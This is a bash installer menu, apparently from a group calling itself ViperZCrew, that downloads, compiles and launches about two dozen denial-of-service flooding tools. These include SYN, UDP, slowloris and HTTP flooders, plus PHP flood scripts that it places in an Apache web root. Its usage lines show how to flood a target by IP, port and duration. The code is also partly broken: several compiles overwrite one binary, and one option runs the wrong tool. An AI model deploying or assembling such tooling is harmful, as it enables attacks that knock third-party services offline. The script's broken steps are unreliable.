#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
RESTORE="\e[39"

FILE=$HOME/DDoS_Downloader/DDoS-Tools



#Banner
clear

echo -e $MAGENTA '
 ▄▄▄· ▄▄▄·  ▄▄· ▄ •▄  ▄▄▄·  ▄▄ • ▄▄▄ .     ▄▄·  ▄ .▄▄▄▄ . ▄▄· ▄ •▄ ▄▄▄ .▄▄▄  
▐█ ▄█▐█ ▀█ ▐█ ▌▪█▌▄▌▪▐█ ▀█ ▐█ ▀ ▪▀▄.▀·    ▐█ ▌▪██▪▐█▀▄.▀·▐█ ▌▪█▌▄▌▪▀▄.▀·▀▄ █·
 ██▀·▄█▀▀█ ██ ▄▄▐▀▀▄·▄█▀▀█ ▄█ ▀█▄▐▀▀▪▄    ██ ▄▄██▀▐█▐▀▀▪▄██ ▄▄▐▀▀▄·▐▀▀▪▄▐▀▀▄ 
▐█▪·•▐█ ▪▐▌▐███▌▐█.█▌▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌    ▐███▌██▌▐▀▐█▄▄▌▐███▌▐█.█▌▐█▄▄▌▐█•█▌
.▀    ▀  ▀ ·▀▀▀ ·▀  ▀ ▀  ▀ ·▀▀▀▀  ▀▀▀     ·▀▀▀ ▀▀▀ · ▀▀▀ ·▀▀▀ ·▀  ▀ ▀▀▀ .▀  ▀
'
echo ''

if [[ $figlet -eq 0 ]]; then
	figlet -f digital "VIPERZCREW"
else
	apt install -y figlet
	clear
	figlet -f digital "VIPERZCREW"
fi

echo ''

#checking if some packages and directory existing

if [[ -d "$FILE" ]]; then
	echo -e $GREEN "
Directory Exists [✓]"
	sleep 0.3
else
	echo -e $RED '
Creating folder...[✗]'
	mkdir DDoS-Tools
fi

function package_checker {

	echo -ne "Python... -> "
	if ! hash python 2>/dev/null; then
		echo -e "\e[1;31mNot installed [✗]"
		apt install python -y
	else
		echo -e "\e[;32mInstalled [✓]"
	fi
	sleep 0.3

	echo -ne "Python2... -> "
	if ! hash python2 2>/dev/null; then
		echo -e "\e[1;31mNot installed [✗]"
		apt install python2 -y
	else
		echo -e "\e[;32mInstalled [✓]"
		
	fi
	sleep 0.3

	echo -ne "Curl... -> "
	if ! hash curl 2>/dev/null; then
		echo -e "\e[1;31mNot installed [✗]"
		apt install curl -y
	else
		echo -e "\e[;32mInstalled [✓]"
	fi
	sleep 0.3

	echo -ne "Clang... -> "
	if ! hash clang 2>/dev/null; then
		echo -e "\e[1;31mNot installed [✗]"
		apt install clang -y
	else
		echo -e "\e[;32mInstalled [✓]"		
	fi
	sleep 0.3
	
	echo -ne "Neofetch... -> "
	if ! hash neofetch 2>/dev/null; then
		echo -e "\e[1;31mNot installed [✗]"
		apt install neofetch -y
	else
		echo -e "\e[;32mInstalled [✓]"
	fi
	sleep 0.3
	
}

package_checker

sleep 3

echo -e $RED ""
figlet Starting...

sleep 1
clear

echo -e $MAGENTA "
  ___  ___      ___   _____         _    
 |   \|   \ ___/ __| |_   _|__  ___| |___
 | |) | |) / _ \__ \   | |/ _ \/ _ \ (_-<
 |___/|___/\___/___/   |_|\___/\___/_/__/                                 
                           by @viperzcrew
"
echo -e $RED 'Version	: v2.0'
echo -e $GREEN 'Tools		: 22'
echo -e $MAGENTA 'Creator	: MrBlackX'
echo -e $BLUE 'Telegram	: @ViperZCrew'
echo ''
echo -e $BLUE "[?] Which tool do you want to install?"
echo -e $CYAN "
[1] Ha3MrX's DDoSer (Termux + Linux) 	[2] HPING3 (Linux)
[3] Anevicon (Linux)			[4] X̶e̶r̶x̶e̶s̶ (no longer available!)
[5] PyDDoZ (Termux + Linux)		[6] Dark Fantasy (Termux + Linux)
[7] DDoS Anoymous (Termux + Linux)	[8] DDoS Pack v1 (11 Tools) (Linux)
[9] Hammer (Termux + Linux)		[10] Torshammer (Termux + Linux)
[11] fl00d & fl00d2 (Termux + Linux)	[12] GoldenEye (Termux + Linux)
[13] Planetwork Tool (Termux + Linux)	[14] Hulk (Termux + Linux)
[15] LITE DDoS (Termux + Linux)		[16] PyFlooder (Termux + Linux)
[17] UfoNet (Linux)			[18] Pentmenu Multi Tool (Termux + Linux)
[19] Unstable DDoS Tool (Termux + Linux)[20] ZAmbie (Linux)
[21] WAScan (Termux + Linux)		[22] PyLoris (Termux + Linux)
[23] SlowLoris(Linux)			[24] Python SYN Flood(Linux)

[99] Exit"

echo -e $YELLOW "
[*] More Tools Coming Soon!!"

echo -e $GREEN ""
read -p "Enter a number: " inp1

if [[ "$inp1" = 1 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	apt install python git -y
	git clone https://github.com/Ha3MrX/DDos-Attack
	cd DDos-Attack
	chmod +x ddos-attack.py
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		python2 ddos-attack.py
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 2 ]]; then
	apt install hping3
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		hping3 -h
	else 
		cd /data/data/com.termux/files/home/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 3 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/Gymmasssorla/anevicon
	cd anevicon
	cargo build --release
	clear
    read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		anevicon
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 5 ]]; then
	cd $HOME
	apt install python -y
	git clone https://github.com/0x01h/pyddoz
	cd pyddoz
	pip3 install -r requirements.txt
	clear
	read -p " [+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		python3 pyddoz.py
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 6 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	apt install python2
	git clone https://github.com/ritvikb99/dark-fantasy-hack-tool
	cd dark-fantasy-hack-tool
	pip2 install html2text
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		python2 dark-fantasy-2.0.3.py
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 7 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	apt install git 
    	git clone https://github.com/M0HAM3D/DDos-Anonymous
    	cd DDos-Anonymous
	bash install.sh -y
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		cat README.md
		sleep 2
		python2 DDos-anonymous.py
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi    
    
if [[ "$inp1" = 8 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	apt update && apt upgrade -y
	apt install gcc net-tools php php-dev -y
	apt-get install libapr1-dev libaprutil1-dev -y
	curl -LO https://www-eu.apache.org/dist//httpd/httpd-2.4.39.tar.gz
	tar -xvzf httpd-2.4.39.tar.gz
	mv -v httpd-2.4.39 /usr/local/src
	cd httpd-2.4.39
	clear
	echo -e $RED "[!] Installing all scripts, this could need a while!"
	sleep 2
	./configure --enable-so
	make
	make install
	cd /usr/local/apache2/bin
	./apachectl start
	cd /usr/local/src
	curl -LO https://www.php.net/distributions/php-7.3.6.tar.bz2
	tar -xvf php-7.3.6.tar.bz2
	cd php-7.3.6
	apt-get install libxml2-dev
    ./configure --with-apxs2=/usr/local/apache2/bin/apxs
    make
    apt-get install libtool-bin
    libtool --finish /usr/local/src/php-7.3.6/libs
    make install
    cp -r php.ini-developement /usr/local/lib/php.ini
    /usr/local/src/php-7.3.6/build/shtool install -c ext/phar/phar.phar /usr/local/bin
    echo "SetHandler application/x-httpd-php" >> /usr/local/apache2/conf/httpd.conf
    restart
    git clone https://github.com/vbooter/DDoS-Scripts
    cd DDoS-Scripts
	clear
	gcc 50x.c -pthread -o ssyn
	gcc ARME.c -pthread -o ssyn
	gcc RUDY.c -pthread -o ssyn
	gcc SLOWLORIS.c -pthread -o ssyn
	gcc SSYN2.c -pthread -o ssyn
	gcc SUDP.c -pthread -o ssyn
	gcc SUDP.c -pthread -o ssyn
	gcc TCP.c -pthread -o ssyn
	gcc UDP.c -pthread -o ssyn
	mv -v 'TCP Shell.php' tcp_shell.php
	mv -v 'UDP Shell.php' udp_shell.php
	cp -r ucp_shell.php /usr/local/apache2/htdocs
    cp -r tcp_shell.php /usr/local/apache2/htdocs
	clear
	echo "[*] For uploading a PHP script, copy the php script to /usr/local/apache2/htdocs and type:
	$ firefox 127.0.0.1/name.php
	i have copied your files to htdocs, simply type for UDP:
	$ firefox localhost/udp_shell.php
	TCP:
	$ firefox localhost/tcp_shell.php
	Normal usage:
	§ ./[script-name] ip port time(commands)"
	
	read -p "Type B for going back to the script, or hold CTRL+C to exit" $run
	if [[ "$run" = "B" || "$run" = "b" ]]; then
		clear
		echo "To see the folder type:
		cd $HOME/DDoS-Scripts && ls
		going back to the downloader site..
		"
		sleep 1
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi    	
	
if [[ "$inp1" = 9 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/cyweb/hammer
	cd hammer && chmod 777 hammer.py
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python3 hammer.py -h
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi  

if [[ "$inp1" = 10 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/dotfighter/torshammer
	cd torshammer && chmod 777 *py
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python2 torshammer.py -h
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi  	

if [[ "$inp1" = 11 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	curl -O https://raw.githubusercontent.com/Gameye98/Gameye98.github.io/master/scripts/fl00d.py
	curl -O https://raw.githubusercontent.com/Gameye98/Gameye98.github.io/master/scripts/fl00d2.py
	mkdir ~/fl00d
	mv fl00d.py ~/fl00d && mv fl00d2.py ~/fl00d
	cd fl00d
	clear
	read -p "[+] Do you want to run the fl00d2 ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python2 fl00d2.py
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi  	

if [[ "$inp1" = 12 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/jseidl/GoldenEye && cd GoldenEye
	chmod +rwx *py
	service tor start
	clear
	echo -e $RED "[*] USAGE: ./goldeneye.py https://website.com [OPTONS]"
	echo -e $RESTORE
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python2 goldeneye.py
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi  	

if [[ "$inp1" = 13 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/Hydra7/Planetwork-DDOS
	cd Planetwork-DDOS
	clear
	echo -e $RED "[*] USAGE: python2 pntddos.py ip port counts
	exampple:
	$ python2 pntddos.py 192.168.0.1 80 65000"
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python2 pntddos.py
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi  		

if [[ "$inp1" = 14 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/darkwarrior3/hulk && cd hulk
	chmod +rwx hulk.py
	clear
	echo -e $RED "[*] USAGE: python hulk.py <url>"
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python2 hulk.py
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi  

if [[ "$inp1" = 15 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/4L13199/LITEDDOS
	cd LITEDDOS && chmod 777 *py
	clear
	echo -e $RED "[*] USAGE: python2 LITEDDOS.py (IP) (PORT) (COUNT)"
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python hulk.py
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi 

if [[ "$inp1" = 16 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/D4Vinci/PyFlooder
	cd PyFlooder && chmod +rwx *
	clear
	echo -e $RED "USAGE: python pyflooder.py (IP)(PORT)(COUNT)"
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python2 pyflooder.py 
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi 

if [[ "$inp1" = 17 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/epsylon/ufonet
	cd ufonet && chmod 777 *
	apt install python-pycurl
	pip install geoip requests pycrypto scrapy whois
	python setup.py install
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		./ufonet --gui 
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi 

if [[ "$inp1" = 18 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/chetan31295/pentmenu
	cd pentmenu && chmod +rwx *
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		./pentmenu 
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi 

if [[ "$inp1" = 19 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/iJoshoa/UnstableDDoS
	cd UnstableDDoS && chmod +rwx *
	pip3 install pysocks bs4 scapy-python3
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python3 UNSTABLE.py
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi 

if [[ "$inp1" = 20 ]]; then
	$HOME/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/zanyarjamal/zambie.git
	cd zambie && chmod +rwx *
	./Installer.sh
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python2 zambie.py
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi 
	
if [[ "$inp1" = 21 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/m4ll0k/Spaghetti
	cd Spaghetti && chmod +rwx *
	clear
	echo -e $RED [*] USAGE: wascan.py --url http://www.site.com/
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python2 wascan.py -h
	else 
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 22 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	curl -LO https://downloads.sourceforge.net/project/pyloris/pyloris/3.2/pyloris-3.2.zip
	unzip pyloris-3.2.zip
	cd pyloris-3.2
	rm -rf *.zip
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
        if [[ "$run" = "Y" || "$run" = "y" ]]; then
                clear
                python pyloris.py -h
        else 
                cd $HOME/Desktop/DDoS_Downloader
                bash downloader.sh
        fi
fi

if [[ "$inp1" = 23 ]]; then
	cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-Tools
	git clone https://github.com/maxkrivich/SlowLoris
	pip install pyslowloris
  cd SlowLoris
	echo -e $RED "[*] USAGE: slowloris [-h] [-u URL] [-s SOCKET_COUNT] [-p PORT]"
  read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
    clear
		slowloris
	else
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 24 ]]; then
  cd /data/data/com.termux/files/home/DDoS_Downloader/DDoS-tools
  git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool
  cd Python-SYN-Flood-Attack-Tool
  read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
    clear
		python3 py3_SYN-Flood.py
	else
		cd $HOME/DDoS_Downloader
		bash downloader.sh
	fi
fi


if [[ "$inp1" = 99 ]]; then
	clear
	read -p "[-] Do you want to join our channel?(Linux only)[Y/N]" que
	if [[ "$que" == "Y" || "$que" == "y" ]]; then
		firefox t.me/telegram.com
	else
		echo -e "[!] closing tool..."
	fi
	echo -e $MAGENTA "
Exiting..."
	sleep 0.5
	echo -e $BLUE "
Thanks for using our script."
	sleep 0.5
	echo -e $GREEN "
[*] Successfully closed!"
	exit
fi
